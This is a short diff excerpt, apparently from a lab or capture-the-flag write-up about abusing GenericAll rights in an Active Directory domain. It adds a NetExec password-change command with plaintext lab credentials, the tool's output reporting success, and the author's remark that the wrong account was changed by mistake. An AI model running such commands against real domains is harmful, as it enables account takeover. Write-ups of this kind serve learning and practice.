@@ -1238,5 +1238,9 @@ Now the user should have been moved i should have GenericAll over them!
 With GenericAll privs i should now be able to change the users password
 
 ```python
-
+nxc smb dc.novacart.local -u cliff.b -p 'safEpAss69' -M change-password -o NEWPASS='Password123!'
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\cliff.b:safEpAss69 
+CHANGE-P... 10.0.18.23      445    DC               [+] Successfully changed password for cliff.b
 ```
+So stupidly, i accidently forgot to specifiy the target user for the password change so this has changed `c`
